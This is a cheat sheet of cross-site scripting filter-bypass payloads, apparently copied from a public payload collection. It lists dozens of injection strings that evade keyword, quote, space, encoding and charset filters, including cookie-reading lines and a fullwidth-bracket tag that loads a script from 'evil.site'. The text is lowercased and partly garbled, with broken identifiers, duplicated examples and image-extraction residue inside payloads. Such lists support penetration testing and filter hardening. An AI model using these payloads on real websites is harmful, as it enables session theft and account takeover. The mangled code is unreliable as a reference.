# xss filter bypass

## summary

- [bypass case sensitive](#bypass-case-sensitive)
- [bypass tag blacklist](#bypass-tag-blacklist)
- [bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
- [bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
- [bypass quotes for string](#bypass-quotes-for-string)
- [bypass quotes in script tag](#bypass-quotes-in-script-tag)
- [bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
- [bypass dot filter](#bypass-dot-filter)
- [bypass parenthesis for string](#bypass-parenthesis-for-string)
- [bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
- [bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
- [bypass space filter](#bypass-space-filter)
- [bypass email filter](#bypass-email-filter)
- [bypass tel uri filter](#bypass-tel-uri-filter)
- [bypass document blacklist](#bypass-document-blacklist)
- [bypass document.cookie blacklist](#bypass-document-cookie-blacklist)
- [bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
- [bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
- [bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
- [bypass ">" using nothing](#bypass--using-nothing)
- [bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
- [bypass ";" using another character](#bypass--using-another-character)
- [bypass using missing charset header](#bypass-using-missing-charset-header)
- [bypass using html encoding](#bypass-using-html-encoding)
- [bypass using katakana](#bypass-using-katakana)
- [bypass using cuneiform](#bypass-using-cuneiform)
- [bypass using lontara](#bypass-using-lontara)
- [bypass using ecmascript6](#bypass-using-ecmascript6)
- [bypass using octal encoding](#bypass-using-octal-encoding)
- [bypass using unicode](#bypass-using-unicode)
- [bypass using utf-7](#bypass-using-utf-7)
- [bypass using utf-8](#bypass-using-utf-8)
- [bypass using utf-16be](#bypass-using-utf-16be)
- [bypass using utf-32](#bypass-using-utf-32)
- [bypass using bom](#bypass-using-bom)
- [bypass using jsfuck](#bypass-using-jsfuck)
- [references](#references)


## bypass case sensitive

to bypass a case-sensitive xss filter, you can try mixing uppercase and lowercase letters within the tags or function names.

```javascript
<script>alert(1)</script>
<script>alert(1)</script>
```

since many xss filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.


## bypass tag blacklist

```javascript
<script x>
<script x>alert('xss')<script y>
```

## bypass word blacklist with code evaluation

```javascript
eval('ale'+'rt(0)');
function("ale"+"rt(1)")();
new function`al\ert\`6\``;
settimeout('ale'+'rt(2)');
setinterval('ale'+'rt(10)');
set.constructor('ale'+'rt(13)')();
set.constructor`al\x65rt\x2814\x29```;
```

## bypass with incomplete html tag

works on ie/firefox/chrome/safari

```javascript

[image extracted text: [image not found]]
 onerror='alert(0)' <
```

## bypass quotes for string

```javascript
string.fromcharcode(88,83,83)
```

## bypass quotes in script tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_get['test'].'";';`?>
  </script>
</html>
```

## bypass quotes in mousedown event

you can bypass a single quote with &#39; in an on mousedown event handler

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">link</a>
```

## bypass dot filter

```javascript
<script>window['alert'](document['domain'])</script>
```

convert ip address into decimal format: ie. `http://192.168.1.1` == `http://3232235777`
http://www.geektools.com/cgi-bin/ipconv.cgi

```javascript
<script>eval(atob("ywxlcnqozg9jdw1lbnquy29va2llkq=="))<script>
```

base64 encoding your xss payload with linux command: ie. `echo -n "alert(document.cookie)" | base64` == `ywxlcnqozg9jdw1lbnquy29va2llkq==`

## bypass parenthesis for string

```javascript
alert`1`
settimeout`alert\u0028document.domain\u0029`;
```

## bypass parenthesis and semi colon

* from @garethheyes
    ```javascript
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>
    ```

* from @terjanq
    ```js
    <script>throw/a/,uncaught=1,g=alert,a=url+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
    ```

* from @cgvwzq
    ```js
    <script>typeerror.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
    ```

## bypass onxxxx blacklist

* use less known tag
    ```html
    <object onafterscriptexecute=confirm(0)>
    <object onbeforescriptexecute=confirm(0)>
    ```

* bypass onxxx= filter with a null byte/vertical tab/carriage return/line feed
    ```html
    
[image extracted text: [image not found]]
 onerror\x00=alert(0) />
    
[image extracted text: [image not found]]
 onerror\x0b=alert(0) />
    
[image extracted text: [image not found]]
 onerror\x0d=alert(0) />
    
[image extracted text: [image not found]]
 onerror\x0a=alert(0) />
    ```

* bypass onxxx= filter with a '/'
    ```js
    
[image extracted text: [image not found]]
 onerror/=alert(0) />
    ```


## bypass space filter

* bypass space filter with "/"
    ```javascript
    <img/src='1'/onerror=alert(0)>
    ```

* bypass space filter with `0x0c/^l` or `0x0d/^m` or `0x0a/^j` or `0x09/^i`
  ```html
  <svgonload=alert(1)>
  ```

```ps1
$ echo "<svg^lonload^l=^lalert(1)^l>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```


## bypass email filter

* [rfc0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
  ```javascript
  "><svg/onload=confirm(1)>"@x.y
  ```

* [rfc5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
  ```javascript
  xss@example.com(
[image extracted text: [image not found]]
 onerror='alert(document.location)'>)
  ```


## bypass tel uri filter

at least 2 rfc mention the `;phone-context=` descriptor:

* [rfc3966 - the tel uri for telephone numbers](https://www.ietf.org/rfc/rfc3966.txt)
* [rfc2806 - urls for telephone calls](https://www.ietf.org/rfc/rfc2806.txt)

```javascript
+330011223344;phone-context=<script>alert(0)</script>
```


## bypass document blacklist

```javascript
<div id = "x"></div><script>alert(x.parentnode.parentnode.parentnode.location)</script>
window["doc"+"ument"]
```

## bypass document.cookie blacklist

this is another way to access cookies on chrome, edge, and opera. replace cookie name with the cookie you are after. you may also investigate the getall() method if that suits your requirements.

```js
window.cookiestore.get('cookie name').then((cookievalue)=>{alert(cookievalue.value);});
```

## bypass using javascript inside a string

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## bypass using an alternate way to redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

## bypass using an alternate way to execute an alert

from [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findindex(alert)
[12].foreach(alert);
```

from [@themiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - using global variables

the object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. that's means that we can access any javascript function by using its **index number instead the function name**.

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

then calling alert is :

```javascript
object.keys(self)[5]
// "alert"
self[object.keys(self)[5]]("1") // alert("1")
```

we can find "alert" with a regular expression like ^a[rel]+t$ :

```javascript
//bind function alert on new function a()
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 

// then you can use a() with object.keys
self[object.keys(self)[a()]]("1") // alert("1")
```

oneliner:

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[object.keys(self)[a()]]("1")
```

from [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

from [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.

```javascript
eval('ale'+'rt(0)');
function("ale"+"rt(1)")();
new function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..tostring(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

settimeout`alert\u0028document.domain\u0029`;
settimeout('ale'+'rt(2)');
setinterval('ale'+'rt(10)');
set.constructor('ale'+'rt(13)')();
set.constructor`al\x65rt\x2814\x29```;
```

bypass using an alternate way to trigger an alert

```javascript
var i = document.createelement("iframe");
i.onload = function(){
  i.contentwindow.alert(1);
}
document.appendchild(i);

// bypassed security
xssobject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      xssobject.lockdown(obj, name);
  };
xssobject.proxy(window, 'alert', 'window.alert', false);
```

## bypass ">" using nothing

there is no need to close the tags, the browser will try to fix it.

```javascript
<svg onload=alert(1)//
```

## bypass "<" and ">" using ＜ and ＞

use unicode characters `u+ff1c` and `u+ff1e`, refer to [bypass using unicode](#bypass-using-unicode) for more.

```javascript
＜script/src=//evil.site/poc.js＞
```

## bypass ";" using another character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```


## bypass using missing charset header

**requirements**:

* server header missing `charset`: `content-type: text/html`

### iso-2022-jp

iso-2022-jp uses escape characters to switch between several character sets.

| escape    | encoding        |
|-----------|-----------------|
| `\x1b (b` | ascii           |
| `\x1b (j` | jis x 0201 1976 |
| `\x1b $@` | jis x 0208 1978 |
| `\x1b $b` | jis x 0208 1983 |


using the [code table](https://en.wikipedia.org/wiki/jis_x_0201#codepage_layout), we can find multiple characters that will be transformed when switching from **ascii** to **jis x 0201 1976**.

| hex  | ascii | jis x 0201 1976 |
| ---- | --- | --- |
| 0x5c | `\` | `¥` | 
| 0x7e | `~` | `‾` |


**example**

use `%1b(j` to force convert a `\'` (ascii) in to `¥'` (jis x 0201 1976), unescaping the quote.

payload: `search=%1b(j&lang=en";alert(1)//`


## bypass using html encoding

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3b%26%23108%3b%26%23101%3b%26%23114%3b%26%23116%3b(document.domain)>
```

## bypass using katakana

using the [aemkei/katakana](https://github.com/aemkei/katakana.js) library.

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

## bypass using cuneiform

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## bypass using lontara

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

more alphabets on http://aem1k.com/aurebesh.js/#

## bypass using ecmascript6

```html
<script>alert&diacriticalgrave;1&diacriticalgrave;</script>
```

## bypass using octal encoding


```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

## bypass using unicode

this payload takes advantage of unicode escape sequences to obscure the javascript function

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

it uses unicode escape sequences to represent characters.

| unicode  | ascii     |
| -------- | --------- |
| `\u0061` | a         |
| `\u006c` | l         |
| `\u0065` | e         |
| `\u0072` | r         |
| `\u0074` | t         |


same thing with these unicode characters.

| unicode (utf-8 encoded) | unicode name                 | ascii | ascii name     |
| ----------------------- | ---------------------------- | ----- | ---------------|
| `\uff1c` (%ef%bc%9c)    | fullwidth less­than sign      | <     | less­than       |
| `\uff1e` (%ef%bc%9e)    | fullwidth greater­than sign   | >     | greater­than    |
| `\u02ba` (%ca%ba)       | modifier letter double prime | "     | quotation mark |
| `\u02b9` (%ca%b9)       | modifier letter prime        | '     | apostrophe     |


an example payload could be `ʺ＞＜svg onload=alert(/xss/)＞/`, which would look like that after being url encoded:

```javascript
%ca%ba%ef%bc%9e%ef%bc%9csvg%20onload=alert%28/xss/%29%ef%bc%9e/
```


when unicode characters are converted to another case, they might bypass a filter look for specific keywords.

| unicode  | transform | character |
| -------- | --------- | --------- |
| `i̇` (%c4%b0) | `tolowercase()` | i |
| `ı` (%c4%b1) | `touppercase()` | i |
| `ſ` (%c5%bf) | `touppercase()` | s |
| `k` (%e2%84) | `tolowercase()` | k |

the following payloads become valid html tags after being converted.

```html
<ſvg onload=... >
<ıframe id=x onload=>
```


## bypass using utf-7

```javascript
+adw-img src=+aci-1+aci- onerror=+aci-alert(1)+aci- /+ad4-
```

## bypass using utf-8

```javascript
< = %c0%bc = %e0%80%bc = %f0%80%80%bc
> = %c0%be = %e0%80%be = %f0%80%80%be
' = %c0%a7 = %e0%80%a7 = %f0%80%80%a7
" = %c0%a2 = %e0%80%a2 = %f0%80%80%a2
" = %ca%ba
' = %ca%b9
```

## bypass using utf-16be

```javascript
%00%3c%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3e%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

## bypass using utf-32

```js
%00%00%00%00%00%3c%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3e
```

## bypass using bom

byte order mark (the page must begin with the bom character.)
bom character allows you to override charset of the page

```js
bom character for utf-16 encoding:
big endian : 0xfe 0xff
little endian : 0xff 0xfe
xss : %fe%ff%00%3c%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3e

bom character for utf-32 encoding:
big endian : 0x00 0x00 0xfe 0xff
little endian : 0xff 0xfe 0x00 0x00
xss : %00%00%fe%ff%00%00%00%3c%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3e
```


## bypass using jsfuck

bypass using [jsfuck](http://www.jsfuck.com/)

```javascript
[][(
[image extracted text: [image not found]]
[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```


## references

- [airbnb – when bypassing json encoding, xss filter, waf, csp, and auditor turns into eight vulnerabilities - brett buerhaus (@bbuerhaus) - march 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)